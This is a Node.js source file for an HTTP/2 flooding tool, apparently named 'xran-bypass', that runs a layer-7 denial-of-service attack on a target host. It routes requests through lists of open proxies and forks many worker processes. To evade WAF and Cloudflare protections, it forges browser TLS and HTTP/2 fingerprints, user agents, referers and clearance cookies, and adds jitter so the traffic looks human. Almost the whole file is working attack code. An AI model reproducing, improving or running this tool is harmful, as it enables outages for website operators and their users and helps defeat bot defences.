const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

// Unified random int helper (replaces duplicate getRandomInt / randomIntn)
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Fixed off-by-one: max index must be length-1
function randomElement(elements) {
    return elements[getRandomInt(0, elements.length - 1)];
}

// Single alphanumeric string generator (fixed-length or range)
function randstr(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function generateRandomString(minLength, maxLength) {
    const len = maxLength !== undefined ? getRandomInt(minLength, maxLength) : minLength;
    return randstr(len);
}
const cplist = [
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];
// cipper is now picked fresh inside runFlooder per connection
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
  const sigalgs = [
     "ecdsa_secp256r1_sha256",
     "rsa_pss_rsae_sha256",
     "rsa_pkcs1_sha256",
     "ecdsa_secp384r1_sha384",
     "rsa_pss_rsae_sha384",
     "rsa_pkcs1_sha384",
     "rsa_pss_rsae_sha512",
     "rsa_pkcs1_sha512"
 ];
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
// Removed SSL_OP_NO_TLSv1_3 — we WANT TLS 1.3 support for modern fingerprinting
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    (crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION || 0) |
    (crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE || 0) |
    (crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT || 0) |
    (crypto.constants.SSL_OP_SINGLE_DH_USE || 0) |
    (crypto.constants.SSL_OP_SINGLE_ECDH_USE || 0) |
    (crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION || 0);
 if (process.argv.length < 7){console.log(`Usage: node xran-bypass [host] [time] [rps] [thread] [proxyfile]`); process.exit();}
 const secureProtocol = "TLS_method";
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        //console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            //console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    // Jitter delay: 200-800ms antar spawn koneksi biar ga kelihatan bot pattern
    const spawnLoop = () => {
        runFlooder();
        const jitter = getRandomInt(200, 800);
        setTimeout(spawnLoop, jitter);
    };
    setTimeout(spawnLoop, getRandomInt(0, 500));
}
  function runFlooder() {
    // Filter proxy kosong/invalid dulu
    const validProxies = proxies.filter(p => p && p.includes(':'));
    if (!validProxies.length) return;
    const proxyAddr = randomElement(validProxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) return;
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
// randstr() already defined globally above — removed duplicate
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

// Compact h2Settings — only chrome/safari/firefox differ meaningfully
const h2Settings = (browser) => {
    const headerTableSize = ['chrome', 'safari'].includes(browser) ? 4096 : 65536;
    const maxStreams = browser === 'chrome' ? 1000 : ['safari', 'firefox'].includes(browser) ? 100 : 500;
    return {
        SETTINGS_HEADER_TABLE_SIZE:    headerTableSize,
        SETTINGS_ENABLE_PUSH:          0,
        SETTINGS_MAX_CONCURRENT_STREAMS: maxStreams,
        SETTINGS_INITIAL_WINDOW_SIZE:  getRandomInt(6291456, 15728640),
        SETTINGS_MAX_FRAME_SIZE:       getRandomInt(16384, 16777215),
        SETTINGS_MAX_HEADER_LIST_SIZE: 262144
    };
};

const generateHeaders = (browser) => {
    // Updated to 2025 browser version ranges
    const versions = {
        chrome:     { min: 128, max: 132 },
        safari:     { min: 17,  max: 18  },
        brave:      { min: 128, max: 132 },
        firefox:    { min: 128, max: 133 },
        mobile:     { min: 128, max: 132 },
        opera:      { min: 112, max: 115 },
        operagx:    { min: 112, max: 115 },
        duckduckgo: { min: 17,  max: 20  }
    };

    const cv = getRandomInt(versions[browser].min, versions[browser].max);

    function generateLegitIP() {
        const pool = ["8.8.8.","1.1.1.","208.67.222.","9.9.9.","149.112.112.","64.6.64."];
        return pool[getRandomInt(0, pool.length-1)] + getRandomInt(1, 254);
    }

    // Browser-specific sec-ch-ua data
    const chv = cv; 
    const chUA = {
        brave:      {ua:`"Brave";v="${cv}", "Chromium";v="${cv}", "Not=A?Brand";v="24"`,      full:`"Brave";v="${cv}.0.0.0", "Chromium";v="${cv}.0.0.0", "Not=A?Brand";v="24.0.0.0"`,      plat:'"Windows"', pver:Math.random()<0.5?'"10.0.0"':'"11.0.0"', arch:'"x86"'},
        chrome:     {ua:`"Google Chrome";v="${cv}", "Chromium";v="${cv}", "Not_A Brand";v="24"`, full:`"Google Chrome";v="${cv}.0.0.0", "Chromium";v="${cv}.0.0.0", "Not_A Brand";v="24.0.0.0"`, plat:'"Windows"', pver:Math.random()<0.6?'"10.0.0"':'"11.0.0"', arch:'"x86"'},
        firefox:    {ua:`"Not A;Brand";v="99", "Mozilla Firefox";v="${cv}"`,                 full:`"Mozilla Firefox";v="${cv}.0.0.0", "Not A;Brand";v="99.0.0.0"`,                       plat:'"Windows"', pver:Math.random()<0.5?'"10.0.0"':'"11.0.0"', arch:'"x86"'},
        safari:     {ua:`"Safari";v="${cv}", "Not A;Brand";v="99"`,                          full:`"Safari";v="${cv}.0.0.0", "Not A;Brand";v="99.0.0.0"`,                                 plat:'"macOS"',   pver:`"15.${getRandomInt(0,5)}"`,              arch:'"arm64"'},
        mobile:     {ua:`"Google Chrome";v="${cv}", "Chromium";v="${cv}", "Not=A?Brand";v="24"`,full:`"Google Chrome";v="${cv}.0.0.0", "Chromium";v="${cv}.0.0.0", "Not=A?Brand";v="24.0.0.0"`, plat:'"Android"', pver:`"${getRandomInt(13,15)}.0"`,              arch:'"arm64"'},
        opera:      {ua:`"Opera";v="${cv}", "Chromium";v="${chv}", "Not_A Brand";v="24"`,     full:`"Opera";v="${cv}.0.0.0", "Chromium";v="${chv}.0.0.0", "Not_A Brand";v="24.0.0.0"`,    plat:'"Windows"', pver:Math.random()<0.5?'"10.0.0"':'"11.0.0"', arch:'"x86"'},
        operagx:    {ua:`"Opera GX";v="${cv}", "Chromium";v="${chv}", "Not_A Brand";v="24"`, full:`"Opera GX";v="${cv}.0.0.0", "Chromium";v="${chv}.0.0.0", "Not_A Brand";v="24.0.0.0"`, plat:'"Windows"', pver:Math.random()<0.5?'"10.0.0"':'"11.0.0"', arch:'"x86"'},
        duckduckgo: {ua:`"DuckDuckGo";v="${cv}", "Chromium";v="${chv}", "Not.A/Brand";v="8"`,full:`"DuckDuckGo";v="${cv}.0.0.0", "Chromium";v="${chv}.0.0.0", "Not.A/Brand";v="8.0.0.0"`,plat:'"Windows"', pver:Math.random()<0.5?'"10.0.0"':'"11.0.0"', arch:'"x86"'},
    }[browser];


    const isMobile = browser === 'mobile';
    const ua = {
        chrome:     `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${cv}.0.${getRandomInt(5000,7000)}.${getRandomInt(0,250)} Safari/537.36`,
        firefox:    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${cv}.0) Gecko/20100101 Firefox/${cv}.0`,
        safari:     `Mozilla/5.0 (Macintosh; Intel Mac OS X 15_${getRandomInt(0,5)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${cv}.0 Safari/605.1.15`,
        opera:      `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chv}.0.${getRandomInt(5000,7000)}.0 Safari/537.36 OPR/${cv}.0.0.0`,
        operagx:    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chv}.0.${getRandomInt(3000,6000)}.0 Safari/537.36 OPR/${cv}.0.0.0 (Edition GX)`,
        brave:      `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${cv}.0.${getRandomInt(5000,7000)}.${getRandomInt(0,250)} Safari/537.36 Brave/${cv}.0.0.0`,
        mobile:     `Mozilla/5.0 (Linux; Android ${getRandomInt(13,15)}; Pixel ${getRandomInt(7,9)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${cv}.0.${getRandomInt(5000,7000)}.0 Mobile Safari/537.36`,
        duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 15_${getRandomInt(0,5)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${cv}.0 DuckDuckGo/7 Safari/605.1.15`,
    }[browser];


    const commonRefs = ["https://www.google.com/","https://store.steampowered.com/","https://www.twitch.tv/","https://discord.com/","https://www.youtube.com/","https://twitter.com/","https://www.reddit.com/","https://www.facebook.com/","https://www.amazon.com/","https://www.netflix.com/","https://news.ycombinator.com/","https://www.nvidia.com/"];
    const commonOris = ["https://www.google.com","https://discord.com","https://store.steampowered.com","https://www.twitch.tv","https://www.reddit.com","https://www.amazon.com","https://www.netflix.com","https://news.ycombinator.com"];
    const refs = browser==='safari'    ? ["https://www.apple.com/","https://www.google.com/","https://www.wikipedia.org/","https://www.reddit.com/","https://www.youtube.com/"]
               : browser==='mobile'    ? ["https://m.google.com/","https://m.youtube.com/","https://m.reddit.com/","https://m.twitter.com/","https://m.instagram.com/","https://m.tiktok.com/"]
               : browser==='duckduckgo'? ["https://duckduckgo.com/",...commonRefs]
               : commonRefs;
    const oris = browser==='safari'    ? ["https://www.apple.com","https://www.wikipedia.org","https://www.twitter.com","https://www.reddit.com","https://www.instagram.com","https://news.ycombinator.com"]
               : browser==='mobile'    ? ["https://m.google.com","https://m.youtube.com","https://m.twitter.com","https://m.reddit.com","https://m.instagram.com","https://m.facebook.com"]
               : browser==='duckduckgo'? ["https://duckduckgo.com",...commonOris]
               : commonOris;

    // Cache IPs — avoids 4 redundant generateLegitIP() calls per block
    const lip1=generateLegitIP(), lip2=generateLegitIP(), lip3=generateLegitIP(), lip4=generateLegitIP();

    const buildAuthority = () => parsedTarget.host;

    const buildPath = () => parsedTarget.path;



    // Weighted Method Selection
    const methods = ['GET', 'POST', 'HEAD'];
    const weights = [0.70, 0.25, 0.05]; // 70% GET, 25% POST, 5% HEAD
    let method = 'GET';
    const rand = Math.random();
    let cumulativeWeight = 0;
    for (let i = 0; i < weights.length; i++) {
        cumulativeWeight += weights[i];
        if (rand < cumulativeWeight) {
            method = methods[i];
            break;
        }
    }

    const base = {
        ':method':   method,
        ':authority': buildAuthority(),
        ':scheme':   'https',
        ':path':     buildPath(),
    };


    const browserHeaders = {
        chrome: {
            'sec-ch-ua':                   chUA.ua,
            'sec-ch-ua-mobile':            isMobile ? '?1' : '?0',
            'sec-ch-ua-platform':          chUA.plat,
            'upgrade-insecure-requests':   '1',
            'user-agent':                  ua,
            'accept':                      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site':              'none',
            'sec-fetch-mode':              'navigate',
            'sec-fetch-user':              '?1',
            'sec-fetch-dest':              'document',
            'accept-encoding':             'gzip, deflate, br, zstd',
            'accept-language':             'en-US,en;q=0.9,id;q=0.8',
            'priority':                    'u=0, i',
        },
        firefox: {
            'user-agent':                  ua,
            'accept':                      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language':             'en-US,en;q=0.5',
            'accept-encoding':             'gzip, deflate, br, zstd',
            'upgrade-insecure-requests':   '1',
            'sec-fetch-dest':              'document',
            'sec-fetch-mode':              'navigate',
            'sec-fetch-site':              'none',
            'sec-fetch-user':              '?1',
            'priority':                    'u=1',
            'te':                          'trailers',
        },
        safari: {
            'user-agent':                  ua,
            'accept':                      'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'sec-fetch-dest':              'document',
            'accept-language':             'en-US,en;q=0.9',
            'sec-fetch-site':              'none',
            'sec-fetch-mode':              'navigate',
            'accept-encoding':             'gzip, deflate, br',
        }
    };

    const selectedHeaders = browserHeaders[browser] || browserHeaders['chrome'];
    
    // Cookie Simulation for "Likely Human"
    const cookies = [
        `__cf_bm=${randstr(40)}`,
        `cf_clearance=${randstr(45)}`,
        `_ga=GA1.1.${getRandomInt(100000000, 999999999)}.${Math.floor(Date.now()/1000)}`,
        `_gid=GA1.1.${getRandomInt(100000000, 999999999)}.${Math.floor(Date.now()/1000)}`,
        `session_id=${generateRandomString(32)}`
    ];

    // Combine in correct order
    const finalHeaders = Object.assign({}, base, selectedHeaders, {
        'cookie': cookies.slice(0, getRandomInt(2, 5)).join('; '),
    });

    // Method-Specific Headers
    if (method === 'POST') {
        finalHeaders['content-type'] = Math.random() < 0.5 ? 'application/x-www-form-urlencoded' : 'application/json';
        finalHeaders['content-length'] = '0'; // Will be updated in request if body added
        finalHeaders['origin'] = randomElement(oris);
        finalHeaders['referer'] = randomElement(refs);
    }

    // Simulasi Fetch Behavior di Target Path (Tanpa merubah path)
    if (Math.random() < 0.1) {
        finalHeaders['accept'] = '*/*';
        finalHeaders['sec-fetch-dest'] = 'empty';
        finalHeaders['sec-fetch-mode'] = 'cors';
        finalHeaders['sec-fetch-site'] = 'same-origin';
        if (method === 'GET') finalHeaders['upgrade-insecure-requests'] = '1';
    }


    return finalHeaders;
};




    const browser = getRandomBrowser();
    let h2_config;
    const h2settings = h2Settings(browser);
    h2_config = transformSettings(Object.entries(h2settings));

    const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

// Fresh cipher pick per connection for better fingerprint diversity
const cipper = cplist[Math.floor(Math.random() * cplist.length)];

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            //console.error('Cipher info is not available. TLS handshake may not have completed.');
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
    
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    let hpack = new HPACK();
    let client;
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : h2settings,
        socket: tlsSocket,
    });
    
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([...h2_config])),
        encodeFrame(0, 8, updateWindow),
        encodeFrame(0, 6, Buffer.from([0,0,0,0,0,0,0,0])) // PING frame for bypass
    ];

    
    client.on('connect', async () => {
        const shuffleObject = (obj) => {
            const keys = Object.keys(obj);
            for (let i = keys.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [keys[i], keys[j]] = [keys[j], keys[i]];
            }
            const shuffledObj = {};
            keys.forEach(key => shuffledObj[key] = obj[key]);
            return shuffledObj;
        };

        // Helper: sleep dengan promise
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));

        let count = 0;
        let running = true;

        const doBurst = async () => {
            if (!running) return;
            if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) {
                running = false;
                return;
            }

            // Target High RPS: Pakai outer 'client' langsung
            const burstSize = Math.max(10, Math.floor(args.Rate / 2)); 
            
            for (let i = 0; i < burstSize; i++) {
                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) break;
                
                const freshBrowser = getRandomBrowser();
                const dynHeaders = generateHeaders(freshBrowser);
                const method = dynHeaders[':method'];

                try {
                    const req = client.request(dynHeaders, {
                        weight: freshBrowser === 'chrome' ? 256 : 220,
                        dependsOn: 0,
                        exclusive: true
                    });
                    
                    if (method === 'POST') {
                        const body = dynHeaders['content-type'] === 'application/json' 
                            ? JSON.stringify({ [randstr(5)]: randstr(12), [randstr(4)]: getRandomInt(100, 999) })
                            : `${randstr(5)}=${randstr(10)}&${randstr(4)}=${randstr(8)}`;
                        
                        // We don't strictly need to update content-length if we just end it, 
                        // but some WAFs check it. For speed, we keep it simple.
                        req.write(body);
                    }

                    req.on('response', () => {
                        req.close();
                        req.destroy();
                    });
                    
                    req.on('error', () => {
                        req.close();
                        req.destroy();
                    });

                    req.end();
                    count++;
                } catch (_) {}


                if (count >= args.time * args.Rate) {
                    running = false;
                    client.close();
                    return;
                }
            }

            if (running) {
                setImmediate(doBurst);
            }
        };






        // Mulai burst pertama dengan jitter awal
        setTimeout(doBurst, getRandomInt(100, 400));
    });
    
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
